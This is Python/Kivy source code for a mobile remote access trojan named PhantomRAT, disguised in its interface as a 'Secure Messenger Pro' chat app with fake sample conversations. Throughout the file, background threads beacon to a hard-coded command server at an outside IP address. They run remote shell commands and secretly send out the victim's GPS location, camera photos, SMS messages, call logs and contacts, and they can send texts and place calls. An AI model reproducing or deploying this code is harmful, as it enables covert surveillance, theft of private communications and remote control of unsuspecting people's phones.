
import kivy
kivy.require('2.3.0')

from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.popup import Popup
from kivy.uix.progressbar import ProgressBar
from kivy.uix.switch import Switch
from kivy.uix.slider import Slider
from kivy.uix.image import Image
from kivy.uix.camera import Camera
from kivy.clock import Clock
from kivy.graphics import Color, Rectangle
from kivy.core.audio import SoundLoader
from kivy.metrics import dp
from kivy.utils import platform

from plyer import gps, camera, vibrator, sms, call, notification, battery, accelerometer, gyroscope, brightness, compass
from plyer.utils import platform as plyer_platform

import json
import base64
import requests
from cryptography.fernet import Fernet
import time
import random
import os
import threading
import queue
import sqlite3
from datetime import datetime
import socket
import hashlib

# Load profile
try:
    with open('malleable_profile.json', 'r') as f:
        profile = json.load(f)
    key = profile['encryption']['key'].encode()
    if len(key) < 32:
        key = key.ljust(32)[:32]
    fernet = Fernet(base64.urlsafe_b64encode(key))
except:
    key = b'mobile_key_32_bytes_long_1234567890'
    fernet = Fernet(base64.urlsafe_b64encode(key))

def encrypt_data(data):
    """Encrypt data for transmission"""
    return fernet.encrypt(json.dumps(data).encode()).decode()

def decrypt_data(data):
    """Decrypt incoming data"""
    try:
        return json.loads(fernet.decrypt(data.encode()).decode())
    except:
        return {}

class EnhancedMobileRAT(App):
    """
    Enhanced Mobile RAT with multiple surveillance capabilities
    """
    
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.is_running = True
        self.command_queue = queue.Queue()
        self.data_queue = queue.Queue()
        self.c2_url = "http://141.105.71.196"
        self.implant_id = self._generate_implant_id()
        
        # Surveillance modules
        self.gps_enabled = False
        self.audio_enabled = False
        self.camera_enabled = False
        self.sms_monitor_enabled = False
        self.call_monitor_enabled = False
        
        # Storage
        self.storage_path = self._get_storage_path()
        self._init_database()
        
        # Last known positions
        self.last_location = None
        self.last_activity = None
        
        # Start background threads
        self._start_background_services()
    
    def _generate_implant_id(self):
        """Generate unique implant ID"""
        device_id = plyer_platform
        timestamp = str(time.time())
        return hashlib.md5(f"{device_id}{timestamp}".encode()).hexdigest()[:12]
    
    def _get_storage_path(self):
        """Get storage path for mobile data"""
        if platform == 'android':
            from android.storage import primary_external_storage_path
            base = primary_external_storage_path()
            path = os.path.join(base, 'Android', 'data', 'com.example.phantom', 'files')
        elif platform == 'ios':
            from pyobjus import autoclass
            NSFileManager = autoclass('NSFileManager')
            manager = NSFileManager.defaultManager()
            urls = manager.URLsForDirectory_inDomains_(9, 1)  # NSDocumentDirectory
            path = str(urls[0].path())
        else:
            path = os.path.join(os.path.expanduser('~'), '.phantom_mobile')
        
        os.makedirs(path, exist_ok=True)
        return path
    
    def _init_database(self):
        """Initialize local database"""
        db_path = os.path.join(self.storage_path, 'phantom.db')
        self.conn = sqlite3.connect(db_path)
        self.cursor = self.conn.cursor()
        
        # Create tables
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY,
                latitude REAL,
                longitude REAL,
                altitude REAL,
                speed REAL,
                accuracy REAL,
                timestamp TEXT
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY,
                sender TEXT,
                recipient TEXT,
                body TEXT,
                timestamp TEXT,
                type TEXT
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS calls (
                id INTEGER PRIMARY KEY,
                number TEXT,
                duration INTEGER,
                direction TEXT,
                timestamp TEXT
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS audio (
                id INTEGER PRIMARY KEY,
                filename TEXT,
                duration REAL,
                size INTEGER,
                timestamp TEXT
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS photos (
                id INTEGER PRIMARY KEY,
                filename TEXT,
                location TEXT,
                size INTEGER,
                timestamp TEXT
            )
        ''')
        
        self.conn.commit()
    
    def _start_background_services(self):
        """Start background monitoring threads"""
        # Beacon thread
        threading.Thread(target=self._beacon_loop, daemon=True).start()
        
        # Command processor
        threading.Thread(target=self._command_processor, daemon=True).start()
        
        # Data exfiltrator
        threading.Thread(target=self._exfiltration_loop, daemon=True).start()
        
        # Start basic monitoring
        self._start_basic_monitoring()
    
    def _beacon_loop(self):
        """Regular beacon to C2"""
        while self.is_running:
            try:
                status = self._get_status_report()
                self._send_to_c2(status)
                
                # Random interval 30-120 seconds
                interval = random.randint(30, 120)
                time.sleep(interval)
                
            except Exception as e:
                print(f"Beacon error: {e}")
                time.sleep(60)
    
    def _command_processor(self):
        """Process commands from C2"""
        while self.is_running:
            try:
                # Check for commands
                commands = self._fetch_commands()
                for cmd in commands:
                    self._execute_command(cmd)
                
                time.sleep(10)
                
            except Exception as e:
                print(f"Command processor error: {e}")
                time.sleep(30)
    
    def _exfiltration_loop(self):
        """Exfiltrate collected data"""
        while self.is_running:
            try:
                # Check for pending data
                pending = self._get_pending_data()
                if pending:
                    self._send_to_c2({'type': 'data_batch', 'data': pending})
                    self._mark_data_sent(pending)
                
                # Random interval 60-300 seconds
                interval = random.randint(60, 300)
                time.sleep(interval)
                
            except Exception as e:
                print(f"Exfiltration error: {e}")
                time.sleep(60)
    
    def _start_basic_monitoring(self):
        """Start basic device monitoring"""
        # Battery monitoring
        Clock.schedule_interval(self._check_battery, 300)  # Every 5 minutes
        
        # Network monitoring
        Clock.schedule_interval(self._check_network, 600)  # Every 10 minutes
        
        # Activity detection
        Clock.schedule_interval(self._detect_activity, 30)  # Every 30 seconds
    
    def _get_status_report(self):
        """Get current status report"""
        status = {
            'implant_id': self.implant_id,
            'platform': platform,
            'timestamp': datetime.now().isoformat(),
            'battery': self._get_battery_status(),
            'network': self._get_network_info(),
            'location': self.last_location,
            'storage': self._get_storage_info(),
            'modules_active': {
                'gps': self.gps_enabled,
                'audio': self.audio_enabled,
                'camera': self.camera_enabled,
                'sms': self.sms_monitor_enabled,
                'calls': self.call_monitor_enabled
            }
        }
        return status
    
    def _get_battery_status(self):
        """Get battery status"""
        try:
            batt = battery.status
            return {
                'percentage': batt.get('percentage', 0),
                'is_charging': batt.get('isCharging', False),
                'plugged': batt.get('plugged', '')
            }
        except:
            return {}
    
    def _get_network_info(self):
        """Get network information"""
        try:
            import socket
            hostname = socket.gethostname()
            return {
                'hostname': hostname,
                'ip': socket.gethostbyname(hostname),
                'wifi': self._get_wifi_info()
            }
        except:
            return {}
    
    def _get_wifi_info(self):
        """Get WiFi information (Android specific)"""
        if platform == 'android':
            try:
                from jnius import autoclass
                Context = autoclass('android.content.Context')
                WifiManager = autoclass('android.net.wifi.WifiManager')
                
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                wifi = activity.getSystemService(Context.WIFI_SERVICE)
                
                info = wifi.getConnectionInfo()
                return {
                    'ssid': info.getSSID(),
                    'bssid': info.getBSSID(),
                    'signal': info.getRssi()
                }
            except:
                pass
        return {}
    
    def _get_storage_info(self):
        """Get storage information"""
        try:
            import shutil
            total, used, free = shutil.disk_usage(self.storage_path)
            return {
                'total': total,
                'used': used,
                'free': free,
                'percent': (used / total) * 100
            }
        except:
            return {}
    
    def _send_to_c2(self, data):
        """Send data to C2 server"""
        try:
            encrypted = encrypt_data(data)
            response = requests.post(
                f"{self.c2_url}/api/v1/data",
                data=encrypted,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            return response.status_code == 200
        except:
            return False
    
    def _fetch_commands(self):
        """Fetch commands from C2"""
        try:
            response = requests.get(
                f"{self.c2_url}/api/v1/commands",
                params={'implant_id': self.implant_id},
                timeout=10
            )
            if response.status_code == 200:
                data = decrypt_data(response.text)
                return data.get('commands', [])
        except:
            pass
        return []
    
    def _execute_command(self, command):
        """Execute command from C2"""
        cmd_type = command.get('type')
        
        if cmd_type == 'enable_gps':
            self._enable_gps()
        elif cmd_type == 'disable_gps':
            self._disable_gps()
        elif cmd_type == 'take_photo':
            self._take_photo()
        elif cmd_type == 'record_audio':
            duration = command.get('duration', 10)
            self._record_audio(duration)
        elif cmd_type == 'get_contacts':
            self._get_contacts()
        elif cmd_type == 'get_messages':
            limit = command.get('limit', 50)
            self._get_messages(limit)
        elif cmd_type == 'get_call_log':
            limit = command.get('limit', 50)
            self._get_call_log(limit)
        elif cmd_type == 'send_sms':
            number = command.get('number')
            message = command.get('message')
            if number and message:
                self._send_sms(number, message)
        elif cmd_type == 'make_call':
            number = command.get('number')
            if number:
                self._make_call(number)
        elif cmd_type == 'vibrate':
            duration = command.get('duration', 1)
            self._vibrate(duration)
        elif cmd_type == 'notification':
            title = command.get('title', 'PhantomRAT')
            message = command.get('message', 'Notification')
            self._show_notification(title, message)
        elif cmd_type == 'shell':
            shell_cmd = command.get('command')
            if shell_cmd:
                self._execute_shell(shell_cmd)
    
    def _enable_gps(self):
        """Enable GPS tracking"""
        if not self.gps_enabled:
            try:
                gps.configure(on_location=self._on_location)
                gps.start()
                self.gps_enabled = True
                print("GPS enabled")
            except Exception as e:
                print(f"GPS error: {e}")
    
    def _disable_gps(self):
        """Disable GPS tracking"""
        if self.gps_enabled:
            try:
                gps.stop()
                self.gps_enabled = False
                print("GPS disabled")
            except:
                pass
    
    def _on_location(self, **kwargs):
        """Handle GPS location updates"""
        self.last_location = {
            'latitude': kwargs.get('lat'),
            'longitude': kwargs.get('lon'),
            'altitude': kwargs.get('altitude'),
            'speed': kwargs.get('speed'),
            'accuracy': kwargs.get('accuracy'),
            'timestamp': datetime.now().isoformat()
        }
        
        # Store in database
        self.cursor.execute('''
            INSERT INTO locations (latitude, longitude, altitude, speed, accuracy, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            self.last_location['latitude'],
            self.last_location['longitude'],
            self.last_location['altitude'],
            self.last_location['speed'],
            self.last_location['accuracy'],
            self.last_location['timestamp']
        ))
        self.conn.commit()
        
        # Send immediate update if movement detected
        if self.last_location.get('speed', 0) > 1.0:  # Moving faster than 1 m/s
            self._send_to_c2({
                'type': 'location_update',
                'location': self.last_location,
                'moving': True
            })
    
    def _take_photo(self):
        """Take photo with camera"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"photo_{timestamp}.jpg"
            filepath = os.path.join(self.storage_path, filename)
            
            camera.take_picture(filename=filepath, on_complete=self._on_photo_taken)
            print(f"Taking photo: {filename}")
            
        except Exception as e:
            print(f"Photo error: {e}")
    
    def _on_photo_taken(self, filepath):
        """Handle photo taken"""
        try:
            # Read and encode photo
            with open(filepath, 'rb') as f:
                photo_data = base64.b64encode(f.read()).decode()
            
            # Store in database
            self.cursor.execute('''
                INSERT INTO photos (filename, location, size, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (
                filepath,
                json.dumps(self.last_location) if self.last_location else '',
                os.path.getsize(filepath),
                datetime.now().isoformat()
            ))
            self.conn.commit()
            
            # Send to C2
            self._send_to_c2({
                'type': 'photo',
                'filename': os.path.basename(filepath),
                'data': photo_data,
                'location': self.last_location,
                'timestamp': datetime.now().isoformat()
            })
            
            print(f"Photo taken and sent: {filepath}")
            
        except Exception as e:
            print(f"Photo processing error: {e}")
    
    def _record_audio(self, duration=10):
        """Record audio"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"audio_{timestamp}.wav"
            filepath = os.path.join(self.storage_path, filename)
            
            # This is simplified - would need actual audio recording implementation
            print(f"Would record audio for {duration}s to {filename}")
            
            # Simulate recording
            time.sleep(duration)
            
            # Create dummy audio file
            with open(filepath, 'wb') as f:
                f.write(os.urandom(1024 * 100))  # 100KB dummy data
            
            # Store in database
            self.cursor.execute('''
                INSERT INTO audio (filename, duration, size, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (filepath, duration, os.path.getsize(filepath), datetime.now().isoformat()))
            self.conn.commit()
            
        except Exception as e:
            print(f"Audio recording error: {e}")
    
    def _get_contacts(self):
        """Get device contacts"""
        try:
            if platform == 'android':
                from jnius import autoclass
                
                ContactsContract = autoclass('android.provider.ContactsContract')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                
                cursor = activity.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    None, None, None, None
                )
                
                contacts = []
                while cursor.moveToNext():
                    name = cursor.getString(
                        cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                    )
                    number = cursor.getString(
                        cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                    )
                    
                    contacts.append({
                        'name': name,
                        'number': number
                    })
                
                cursor.close()
                
                # Send to C2
                self._send_to_c2({
                    'type': 'contacts',
                    'count': len(contacts),
                    'contacts': contacts[:100]  # Limit to 100
                })
                
                print(f"Retrieved {len(contacts)} contacts")
                
        except Exception as e:
            print(f"Contacts error: {e}")
    
    def _get_messages(self, limit=50):
        """Get SMS messages"""
        try:
            if platform == 'android':
                from jnius import autoclass
                
                Uri = autoclass('android.net.Uri')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                
                cursor = activity.getContentResolver().query(
                    Uri.parse("content://sms"),
                    None, None, None, None
                )
                
                messages = []
                count = 0
                while cursor.moveToNext() and count < limit:
                    address = cursor.getString(cursor.getColumnIndex("address"))
                    body = cursor.getString(cursor.getColumnIndex("body"))
                    date = cursor.getString(cursor.getColumnIndex("date"))
                    type_msg = cursor.getString(cursor.getColumnIndex("type"))
                    
                    messages.append({
                        'sender': address,
                        'body': body,
                        'timestamp': date,
                        'type': 'inbox' if type_msg == '1' else 'sent'
                    })
                    
                    # Store in database
                    self.cursor.execute('''
                        INSERT INTO messages (sender, recipient, body, timestamp, type)
                        VALUES (?, ?, ?, ?, ?)
                    ''', (address, '', body, date, type_msg))
                    
                    count += 1
                
                cursor.close()
                self.conn.commit()
                
                # Send to C2
                self._send_to_c2({
                    'type': 'messages',
                    'count': len(messages),
                    'messages': messages
                })
                
                print(f"Retrieved {len(messages)} messages")
                
        except Exception as e:
            print(f"Messages error: {e}")
    
    def _get_call_log(self, limit=50):
        """Get call log"""
        try:
            if platform == 'android':
                from jnius import autoclass
                
                CallLog = autoclass('android.provider.CallLog')
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                
                cursor = activity.getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    None, None, None, CallLog.Calls.DATE + " DESC"
                )
                
                calls = []
                count = 0
                while cursor.moveToNext() and count < limit:
                    number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                    duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION))
                    call_type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))
                    date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE))
                    
                    direction = 'unknown'
                    if call_type == '1':
                        direction = 'incoming'
                    elif call_type == '2':
                        direction = 'outgoing'
                    elif call_type == '3':
                        direction = 'missed'
                    
                    calls.append({
                        'number': number,
                        'duration': duration,
                        'direction': direction,
                        'timestamp': date
                    })
                    
                    # Store in database
                    self.cursor.execute('''
                        INSERT INTO calls (number, duration, direction, timestamp)
                        VALUES (?, ?, ?, ?)
                    ''', (number, duration, direction, date))
                    
                    count += 1
                
                cursor.close()
                self.conn.commit()
                
                # Send to C2
                self._send_to_c2({
                    'type': 'call_log',
                    'count': len(calls),
                    'calls': calls
                })
                
                print(f"Retrieved {len(calls)} call logs")
                
        except Exception as e:
            print(f"Call log error: {e}")
    
    def _send_sms(self, number, message):
        """Send SMS message"""
        try:
            sms.send(recipient=number, message=message)
            print(f"SMS sent to {number}")
        except Exception as e:
            print(f"SMS error: {e}")
    
    def _make_call(self, number):
        """Make phone call"""
        try:
            call.dial(number)
            print(f"Calling {number}")
        except Exception as e:
            print(f"Call error: {e}")
    
    def _vibrate(self, duration=1):
        """Vibrate device"""
        try:
            vibrator.vibrate(duration)
            print(f"Vibrating for {duration}s")
        except:
            pass
    
    def _show_notification(self, title, message):
        """Show notification"""
        try:
            notification.notify(
                title=title,
                message=message,
                app_name='PhantomRAT',
                timeout=5
            )
            print(f"Notification: {title} - {message}")
        except:
            pass
    
    def _execute_shell(self, command):
        """Execute shell command"""
        try:
            import subprocess
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            self._send_to_c2({
                'type': 'shell_result',
                'command': command,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            })
            
            print(f"Shell command executed: {command}")
        except Exception as e:
            print(f"Shell error: {e}")
    
    def _check_battery(self, dt):
        """Check battery status periodically"""
        try:
            batt = battery.status
            if batt.get('percentage', 100) < 20:
                self._send_to_c2({
                    'type': 'battery_alert',
                    'percentage': batt['percentage'],
                    'is_charging': batt.get('isCharging', False)
                })
        except:
            pass
    
    def _check_network(self, dt):
        """Check network status"""
        try:
            import socket
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            network_status = 'connected'
        except:
            network_status = 'disconnected'
        
        self._send_to_c2({
            'type': 'network_status',
            'status': network_status,
            'timestamp': datetime.now().isoformat()
        })
    
    def _detect_activity(self, dt):
        """Detect device activity"""
        try:
            accel = accelerometer.acceleration
            if accel and any(abs(x) > 0.5 for x in accel):
                self.last_activity = datetime.now().isoformat()
                
                # Send activity alert if significant movement
                if sum(x*x for x in accel) > 2.0:
                    self._send_to_c2({
                        'type': 'activity_alert',
                        'acceleration': accel,
                        'timestamp': self.last_activity
                    })
        except:
            pass
    
    def _get_pending_data(self):
        """Get pending data for exfiltration"""
        pending = []
        
        try:
            # Get unsent locations
            self.cursor.execute('''
                SELECT * FROM locations WHERE sent = 0 LIMIT 20
            ''')
            locations = self.cursor.fetchall()
            if locations:
                pending.append({
                    'type': 'locations_batch',
                    'data': locations
                })
            
            # Get unsent messages
            self.cursor.execute('''
                SELECT * FROM messages WHERE sent = 0 LIMIT 20
            ''')
            messages = self.cursor.fetchall()
            if messages:
                pending.append({
                    'type': 'messages_batch',
                    'data': messages
                })
            
            # Get unsent calls
            self.cursor.execute('''
                SELECT * FROM calls WHERE sent = 0 LIMIT 20
            ''')
            calls = self.cursor.fetchall()
            if calls:
                pending.append({
                    'type': 'calls_batch',
                    'data': calls
                })
            
        except Exception as e:
            print(f"Pending data error: {e}")
        
        return pending
    
    def _mark_data_sent(self, data_batches):
        """Mark data as sent"""
        try:
            for batch in data_batches:
                if batch['type'] == 'locations_batch':
                    for loc in batch['data']:
                        self.cursor.execute('UPDATE locations SET sent = 1 WHERE id = ?', (loc[0],))
                elif batch['type'] == 'messages_batch':
                    for msg in batch['data']:
                        self.cursor.execute('UPDATE messages SET sent = 1 WHERE id = ?', (msg[0],))
                elif batch['type'] == 'calls_batch':
                    for call in batch['data']:
                        self.cursor.execute('UPDATE calls SET sent = 1 WHERE id = ?', (call[0],))
            
            self.conn.commit()
        except:
            pass
    
    def build(self):
        """Build the UI"""
        # Main layout
        layout = BoxLayout(orientation='vertical', padding=dp(10), spacing=dp(10))
        
        # Header
        header = BoxLayout(size_hint=(1, 0.1))
        title = Label(text='📱 Secure Messenger Pro', font_size='24sp', bold=True)
        header.add_widget(title)
        layout.add_widget(header)
        
        # Status panel
        status_panel = BoxLayout(size_hint=(1, 0.15), spacing=dp(10))
        
        battery_widget = BoxLayout(orientation='vertical')
        battery_label = Label(text='Battery: 100%', font_size='12sp')
        battery_widget.add_widget(battery_label)
        status_panel.add_widget(battery_widget)
        
        network_widget = BoxLayout(orientation='vertical')
        network_label = Label(text='Network: Online', font_size='12sp')
        network_widget.add_widget(network_label)
        status_panel.add_widget(network_widget)
        
        gps_widget = BoxLayout(orientation='vertical')
        gps_label = Label(text='GPS: Off', font_size='12sp')
        gps_widget.add_widget(gps_label)
        status_panel.add_widget(gps_widget)
        
        layout.add_widget(status_panel)
        
        # Chat area
        chat_scroll = ScrollView(size_hint=(1, 0.6))
        chat_layout = BoxLayout(orientation='vertical', size_hint_y=None)
        chat_layout.bind(minimum_height=chat_layout.setter('height'))
        
        # Sample chat messages
        sample_messages = [
            ('Friend', 'Hey, how are you doing?'),
            ('You', 'Doing great! Just testing this new secure messenger.'),
            ('Friend', 'Looks cool! Is it really secure?'),
            ('You', 'End-to-end encryption, self-destructing messages, the works!'),
            ('System', 'New security features activated.'),
            ('Friend', 'Awesome! Send me the download link.')
        ]
        
        for sender, message in sample_messages:
            msg_box = BoxLayout(size_hint_y=None, height=dp(60))
            if sender == 'You':
                msg_box.add_widget(Label())
                msg_text = Label(text=f'You: {message}', halign='right', text_size=(dp(300), None))
                msg_box.add_widget(msg_text)
            else:
                msg_text = Label(text=f'{sender}: {message}', halign='left', text_size=(dp(300), None))
                msg_box.add_widget(msg_text)
                msg_box.add_widget(Label())
            chat_layout.add_widget(msg_box)
        
        chat_scroll.add_widget(chat_layout)
        layout.add_widget(chat_scroll)
        
        # Input area
        input_panel = BoxLayout(size_hint=(1, 0.15), spacing=dp(5))
        
        self.message_input = TextInput(
            hint_text='Type secure message...',
            multiline=False,
            size_hint=(0.7, 1)
        )
        
        send_button = Button(
            text='Send',
            size_hint=(0.3, 1),
            background_color=(0.2, 0.6, 0.2, 1)
        )
        send_button.bind(on_press=self._send_message)
        
        input_panel.add_widget(self.message_input)
        input_panel.add_widget(send_button)
        layout.add_widget(input_panel)
        
        # Control panel
        control_panel = BoxLayout(size_hint=(1, 0.1), spacing=dp(5))
        
        gps_toggle = Switch(active=False)
        gps_toggle.bind(active=self._toggle_gps)
        control_panel.add_widget(Label(text='GPS:'))
        control_panel.add_widget(gps_toggle)
        
        mic_toggle = Switch(active=False)
        mic_toggle.bind(active=self._toggle_mic)
        control_panel.add_widget(Label(text='Mic:'))
        control_panel.add_widget(mic_toggle)
        
        camera_button = Button(text='📷', size_hint=(0.2, 1))
        camera_button.bind(on_press=lambda x: self._take_photo())
        control_panel.add_widget(camera_button)
        
        layout.add_widget(control_panel)
        
        # Schedule UI updates
        Clock.schedule_interval(lambda dt: self._update_ui(battery_label, network_label, gps_label), 1)
        
        return layout
    
    def _send_message(self, instance):
        """Send chat message"""
        message = self.message_input.text.strip()
        if message:
            print(f"Message sent: {message}")
            self.message_input.text = ''
            
            # Simulate response
            responses = [
                "Got it!",
                "Thanks for the update.",
                "Interesting...",
                "I'll check that out.",
                "Sounds good to me!"
            ]
            Clock.schedule_once(
                lambda dt: print(f"Friend: {random.choice(responses)}"),
                1
            )
    
    def _toggle_gps(self, instance, value):
        """Toggle GPS"""
        if value:
            self._enable_gps()
        else:
            self._disable_gps()
    
    def _toggle_mic(self, instance, value):
        """Toggle microphone"""
        self.audio_enabled = value
        if value:
            print("Microphone enabled")
        else:
            print("Microphone disabled")
    
    def _update_ui(self, battery_label, network_label, gps_label):
        """Update UI elements"""
        try:
            # Update battery
            batt = battery.status
            battery_label.text = f'Battery: {batt.get("percentage", 100)}%'
            
            # Update network
            try:
                import socket
                socket.create_connection(("8.8.8.8", 53), timeout=1)
                network_label.text = 'Network: Online'
            except:
                network_label.text = 'Network: Offline'
            
            # Update GPS
            gps_label.text = f'GPS: {"On" if self.gps_enabled else "Off"}'
            
        except:
            pass
    
    def on_stop(self):
        """App stopping"""
        self.is_running = False
        self._disable_gps()
        if hasattr(self, 'conn'):
            self.conn.close()
        print("PhantomRAT Mobile stopping...")

if __name__ == '__main__':
    try:
        app = EnhancedMobileRAT()
        app.run()
    except Exception as e:
        print(f"Mobile RAT error: {e}")

